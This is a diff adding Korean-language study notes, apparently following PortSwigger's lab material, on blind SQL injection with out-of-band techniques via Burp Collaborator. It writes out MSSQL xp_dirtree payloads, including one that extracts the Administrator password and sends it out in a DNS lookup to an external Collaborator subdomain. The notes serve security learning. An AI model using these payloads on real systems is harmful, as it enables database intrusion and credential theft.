@@ -1048,4 +1048,58 @@ print(f"Password: {password}")
 
 <br>
 
-out-of-band 기술을 사용하기에 가장 쉽고 신뢰할 수 있는 도구는 *Burp Collaborator*이다. 이는 DNS를 포함한 다양한 네트워크 서비스의 커스텀 구현을 제공하는 서버이다.
+out-of-band 기술을 사용하기에 가장 쉽고 신뢰할 수 있는 도구는 *Burp Collaborator*이다. 이는 DNS를 포함한 다양한 네트워크 서비스의 커스텀 구현을 제공하는 서버이다. 이를 통해 취약한 애플리케이션에 개별적인 페이로드를 전송한 결과 네트워크 상호작용이 발생하는 시기를 감지할 수 있다.
+
+<br>
+
+```
+'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
+```
+
+DNS 쿼리를 트리거하기 위한 기술은 사용하고 있는 데이터베이스의 종류에 따라 특정된다. 예를 들어, 위의 Microsoft SQL Server에 대한 입력 값을 사용하여 지정된 도메인에서 DNS 조회를 수행할 수 있다.
+
+<br>
+
+`0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`
+
+이는 위의 도메인에서 데이터베이스를 조회할 수 있게 해준다.
+
+<br>
+
+*Burp Collaborator*를 사용하여 고유한 서브 도메인을 생성하고 Collaborator Server를 poll하여 DNS 조회가 언제 발생하는지 확인할 수 있다.
+
+<br>
+
+## 🚩Lab: Blind SQL injection with out-of-band interaction
+
+(Skipped)
+
+<br>
+
+`'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`
+
+out-of-band 상호작용을 트리거하는 방법을 확인한 후에는 위와 같이 out-of-band 채널을 사용하여 취약한 애플리케이션에서 데이터를 추출할 수 있다.
+
+<br>
+
+이 입력은 `Administrator` 사용자의 패스워드를 읽고, 고유한 Collaborator 서브 도메인을 추가하고, DNS 조회를 트리거한다. 이 조회는 캡쳐된 패스워드를 볼 수 있게 해준다.
+
+<br>
+
+Out-of-baand (OAST) 기술은 out-of-band 채널 내에서 직접적으로 데이터를 추출하는 능력과 높은 성공 확률 덕분에 블라인드 SQL 인젝션이 존재하는지 탐지하고 익스플로잇하는 강력한 방법이다. 이러한 이유로, OAST 기술은 다른 맹목적인 공격 기술이 작동하는 상황에서도 선호되는 경우가 많다.
+
+<br>
+
+> out-of-band 상호작용을 트리거하는 다양한 방법이 있고 다양한 데이터베이스 종류에 적용되는 다양한 기술이 있다. 자세한 내용은 [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)에서 확인할 수 있다.
+{: .prompt-info }
+
+<br>
+
+## 🚩Lab: Blind SQL injection with out-of-band data exfiltration
+
+(Skipped)
+
+<br><br>
+
+# #SQL injection in different contexts
+
